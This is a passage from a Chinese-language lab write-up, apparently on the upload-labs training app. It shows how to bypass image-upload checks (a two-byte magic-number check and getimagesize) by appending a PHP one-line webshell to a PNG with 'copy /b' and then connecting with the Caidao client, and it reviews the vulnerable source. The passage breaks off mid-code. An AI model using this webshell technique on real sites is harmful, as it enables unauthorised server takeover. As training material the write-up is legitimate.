&lt;p&gt;&lt;img src=&#34;image-20221003233349810.png&#34; alt=&#34;image-20221003233349810&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过unpack头两字节&#34;&gt;&lt;a href=&#34;#绕过unpack头两字节&#34; class=&#34;headerlink&#34; title=&#34;绕过unpack头两字节&#34;&gt;&lt;/a&gt;绕过unpack头两字节&lt;/h3&gt;&lt;p&gt;使用windows的copy命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy /?&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003233804358.png&#34; alt=&#34;image-20221003233804358&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们准备两个文件，一个是正常的png图片&lt;code&gt;webshell.png&lt;/code&gt;，一个是一句话木马的php文件&lt;code&gt;backdoor.php&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy webshell.png /b + backdoor.php /b backdoor.png&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003234531986.png&#34; alt=&#34;image-20221003234531986&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么可以上传这个文件，可以看到成功上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003234801987.png&#34; alt=&#34;image-20221003234801987&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003234900575.png&#34; alt=&#34;image-20221003234900575&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀成功连接：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003234932717.png&#34; alt=&#34;image-20221003234932717&#34;&gt;&lt;/p&gt;
&lt;p&gt;回过头来看源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;getReailFileType&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;fopen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//只读方式打开，读取字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$bin&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;fread&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//只读2字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;fclose&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//关闭文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt; = @&lt;span class=&#34;title function_ invoke__&#34;&gt;unpack&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;C2chars&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$bin&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//将$bin解包，C：有序的字符 2:2个 chars：变成chars array&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$typeCode&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;intval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;chars1&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;chars2&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;comment&#34;&gt;//chars1=“xxx&amp;quot;,  chars2=&amp;quot;xxxx&amp;quot;,将这两个字符串拼接后变成整数付给$typeCode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$typeCode&lt;/span&gt;)&amp;#123;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;255216&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;13780&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7173&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;unknown&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_type&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;getReailFileType&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_type&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;unknown&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_type&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，isset函数通过下面的会很好理解：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;就是一个变量已声明，且不为NULL（可以是’ ‘）时，会返回真。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 结果为 TRUE，所以后边的文本将被打印出来。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;This var is set so I will print.&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// the return value of isset().&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;anothertest&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));      &lt;span class=&#34;comment&#34;&gt;// TRUE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;)); &lt;span class=&#34;comment&#34;&gt;// TRUE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;unset&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));     &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;)); &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$foo&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$foo&lt;/span&gt;));   &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pie&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;apple&amp;#x27;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt;]));            &lt;span class=&#34;comment&#34;&gt;// TRUE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;foo&amp;#x27;&lt;/span&gt;]));             &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;]));           &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 键 &amp;#x27;hello&amp;#x27; 的值等于 NULL，所以被认为是未置值的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 如果想检测 NULL 键值，可以试试下边的方法。 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_key_exists&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;)); &lt;span class=&#34;comment&#34;&gt;// TRUE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Checking deeper array values&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pie&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]));        &lt;span class=&#34;comment&#34;&gt;// TRUE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pie&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;]));        &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;cake&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;]));  &lt;span class=&#34;comment&#34;&gt;// FALSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过getimagesize&#34;&gt;&lt;a href=&#34;#绕过getimagesize&#34; class=&#34;headerlink&#34; title=&#34;绕过getimagesize&#34;&gt;&lt;/a&gt;绕过getimagesize&lt;/h3&gt;&lt;p&gt;Pass-14和Pass-13绕过方式一样，同样&lt;code&gt;上传图片copy拼接马&lt;/code&gt;即可。&lt;/p&gt;
&lt;p&gt;我们直接来看源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$types&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;.jpeg|.png|.gif&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;))&amp;#123;&lt;span class=&#34;comment&#34;&gt;//传进来的非空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$info&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;getimagesize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;image_type_to_extension&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$info&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;span class=&#34;comment&#34;&gt;//我们只需要提取图像信息中的【索引2】，也就是类型信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;stripos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$types&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;)&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;span class=&#34;comment&#34;&gt;//从$types(类型集合)里面寻找$ext(当前上传图像类型)第一次出现的位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span 